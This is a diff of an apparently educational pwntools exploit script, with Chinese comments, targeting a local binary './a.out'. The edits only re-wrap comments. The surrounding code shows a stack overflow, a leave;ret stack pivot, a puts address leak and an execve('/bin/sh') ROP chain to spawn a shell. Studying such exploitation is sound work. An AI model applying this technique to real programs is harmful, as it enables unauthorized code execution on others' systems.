@@ -76,7 +76,8 @@ elf  = ELF("./a.out")
 libc = elf.libc
 
 # 需要的gadget，需要使用ROPgadget获取，必需确保其正确
-# 可以使用我放在此目录下的 lookfor.py ，封装了 ROPgadget 命令，方便同时查找多个gadget
+# 可以使用我放在此目录下的 lookfor.py ，封装了 ROPgadget 命令，
+# 方便同时查找多个gadget
 ### - 复现时记得修改此处的gedget！ - ###
 pop_rdi   = 0x000000000040113a
 leave_ret = 0x0000000000401199
@@ -110,8 +111,8 @@ payload = flat({
         p64(leave_ret),    # 覆盖返回地址
     ]
 })
-# 第二次输入 Read 2，审查反汇编代码发现，read 给我们的注入点在栈上 rbp-0x20 ，但是
-# 允许输入 0x30 字节，栈溢出了 0x10 字节，导致了保存的栈底和返回地址被覆盖
+# 第二次输入 Read 2，审查反汇编代码发现，read 给我们的注入点在栈上 rbp-0x20 ，
+# 但是允许输入 0x30 字节，栈溢出了 0x10 字节，导致了保存的栈底和返回地址被覆盖
 # 
 # 这个注入中：
 # - p64(0x404E40) 覆盖栈底地址为 0x404E40，即 0x404040+0xE00，即 buf+0xE00，
@@ -119,11 +120,11 @@ payload = flat({
 #                 rbp = 0x404E40
 # - p64(leave_ret)覆盖返回地址为 gadget `leave; ret`的地址，使 leave; ret 被
 #                 执行。leave; ret 相当于 `mov rsp, rbp; pop rbp; pop rip`
-#                 mov rsp, rbp  ; 上面已经使 rbp = 0x404E40，这里使得
-#                               ; rsp = rbp = 0x404E40，通过控制rbp间接修改rsp
-#                 pop rbp       ; 弹出栈顶的地址作为栈底，因为rsp已经被上一条改变，
-#                               ; 这里会弹出0xdeadbeef，因为rbp已经不需要了
-#                 pop rip       ; 0xdeadbeef 被弹出，泄漏puts地址的ROP开始执行
+#               mov rsp, rbp  ; 上面已经使 rbp = 0x404E40，这里使得
+#                             ; rsp = rbp = 0x404E40，通过控制rbp间接修改rsp
+#               pop rbp       ; 弹出栈顶的地址作为栈底，因为rsp已经被上一条改变，
+#                             ; 这里会弹出0xdeadbeef，因为rbp已经不需要了
+#               pop rip       ; 0xdeadbeef 被弹出，泄漏puts地址的ROP开始执行
 
 p.sendafter(b"Read 2\n", payload)
 
@@ -173,8 +174,8 @@ payload = b'a' * 0x600     + \
           # execve("/bin/sh", 0, 0)
           # execve的系统调用号为59
 # 在上面的第一次 Read 1 注入中，我们在末尾再次调用了 main，使 main 再次运行
-# 这里是第二次 Read 1，我们终于可以使用 libc 中庞大的 gadget 构造ROP链了。这里使用
-# 系统调用的方法 getshell，ROP链放在 buf+0x600 处，即 0x404640
+# 这里是第二次 Read 1，我们终于可以使用 libc 中庞大的 gadget 构造ROP链了。
+# 这里使用系统调用的方法 getshell，ROP链放在 buf+0x600 处，即 0x404640
 
 
 
@@ -188,8 +189,8 @@ payload = flat({
         p64(leave_ret),
     ]
 })
-# 最后一次 Read 2 注入，具体流程如上一次 Read 2 时注入一样，通过控制rbp间接控制rsp，
-# 使 rsp 移动到我们上面构建的ROP链 0x404640 上 getshell
+# 最后一次 Read 2 注入，具体流程如上一次 Read 2 时注入一样，通过控制rbp间接
+# 控制rsp，使 rsp 移动到我们上面构建的ROP链 0x404640 上 getshell
 
 p.sendafter(b"Read 2\n", payload)
 gdb.attach(p)
